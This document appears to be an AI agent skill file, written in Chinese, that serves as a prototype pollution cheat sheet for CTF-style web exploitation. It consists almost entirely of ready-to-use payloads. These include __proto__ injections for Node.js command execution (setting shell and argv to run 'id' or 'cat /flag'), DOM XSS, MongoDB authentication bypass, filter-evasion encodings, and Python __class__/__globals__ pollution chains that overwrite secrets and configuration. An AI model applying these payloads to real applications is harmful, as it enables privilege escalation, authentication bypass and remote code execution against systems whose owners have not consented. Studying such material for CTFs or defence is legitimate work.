---
name: prototype-pollution
description: Use when encountering 原型链污染 - JS/Python原型链污染、RCE、XSS、绕过检测
---

# 原型链污染

## Info

- **Domain**: web
- **Tags**: web, prototype-pollution, javascript

## 基础Payload
```javascript
{"__proto__": {"admin": true}}
{"constructor.prototype": {"admin": true}}
{"__proto__": {"__proto__": {"admin": true}}}
```

## 服务端RCE (Node.js)
```javascript
// child_process
{"__proto__": {"shell": "/proc/self/exe", "argv": ["-c", "id"]}}

// 通过require
{"__proto__": {"require": "child_process"}}

// 污染环境变量
{"__proto__": {"NODE_OPTIONS": "--require=/proc/self/cmdline"}}
```

## 客户端XSS
```javascript
// DOM污染
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
{"__proto__": {"src": "javascript:alert(1)"}}

// 污染表单action
{"__proto__": {"action": "javascript:alert(1)"}}
```

## NoSQL注入
```javascript
// MongoDB
{"__proto__": {"$ne": ""}}      // 不等于空
{"__proto__": {"$gt": ""}}      // 大于空
{"__proto__": {"$where": "1==1"}}

// 绕过认证
{"username": "admin", "password": {"__proto__": {"$gt": ""}}}
```

## 污染位置
```javascript
// URL参数
?__proto__[admin]=true
?constructor[prototype][admin]=true

// JSON body
{"__proto__": {"admin": true}}

// 深度合并
merge(target, JSON.parse('{"__proto__":{"admin":true}}'))

// Object.assign
Object.assign(target, JSON.parse('{"__proto__":{"admin":true}}'))
```

## 探测方法
```javascript
// 检查是否可污染
{}.__proto__.test = 1;
({}).test === 1;  // true表示可污染

// 检查constructor
{}.constructor.prototype

// 检查Object.prototype
Object.prototype.polluted = 1;
({}).polluted;  // 1
```

## 常见漏洞函数
```javascript
// 危险函数
Object.assign()
_.merge()
_.defaultsDeep()
$.extend()
JSON.parse() + merge()
recursiveMerge()
```

## 绕过过滤
```javascript
// 绕过__proto__过滤
{"constructor": {"prototype": {"admin": true}}}
{"__proto__": {"__proto__": {"admin": true}}}
{"__pro"+"to__": {"admin": true}}  // 拼接绕过

// Unicode编码
{"\u005f\u005fproto\u005f\u005f": {"admin": true}}
```

## CTF常见利用
```javascript
// 1. 污染isAdmin
{"__proto__": {"isAdmin": true}}

// 2. 污染命令执行
{"__proto__": {"shell": "cat /flag"}}

// 3. 污染文件路径
{"__proto__": {"outputFile": "/tmp/flag"}}

// 4. 绕过验证
{"__proto__": {"authenticated": true}}
```

---

## Python 原型链污染

### 原理

Python 中通过 `merge` 等递归合并函数，利用 `hasattr`/`getattr`/`setattr` 遍历对象属性，污染类属性或全局变量。

**关键路径**:
- `__class__` → 获取实例的类
- `__base__` → 获取父类
- `__globals__` → 获取函数全局命名空间
- `__init__` → 构造函数

### 污染类属性

```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class father:
    secret = "hello"
class son_b(father):
    pass

instance = son_b()
payload = {"__class__": {"__base__": {"secret": "world"}}}
merge(payload, instance)
# 调用链: instance → instance.__class__(son_b) → son_b.__base__(father) → setattr(father, "secret", "world")
# 结果: father.secret = "world"，所有子类共享
```

### 污染全局变量（通过 `__globals__`）

```python
a = 1
class A:
    def __init__(self):
        pass
class B:
    classa = 2

instance = A()
payload = {
    "__init__": {
        "__globals__": {
            "a": 4,
            "B": {"classa": 5}
        }
    }
}
merge(payload, instance)
# 调用链: instance → instance.__init__ → __init__.__globals__ → 设置 a=4, B.classa=5
# 结果: 全局变量 a 被修改为 4，B.classa 被修改为 5
```

### 常见利用路径

```python
# 1. 污染父类属性
{"__class__": {"__base__": {"secret_key": "attacker"}}}

# 2. 污染全局配置
{"__init__": {"__globals__": {"config": {"admin": True}}}}

# 3. 污染函数默认参数
{"func_name": {"__globals__": {"SECRET": "new_value"}}}

# 4. 污染类方法
{"__class__": {"method_name": {"__globals__": {"FLAG": "leaked"}}}}
```

### 检测步骤

```python
# 1. 查找 merge/deepcopy/update 类函数
# 2. 检查是否使用 hasattr/getattr/setattr 递归
# 3. 追踪 payload 能到达的 __class__/__base__/__globals__ 路径
# 4. 确定最终 setattr 的目标属性
```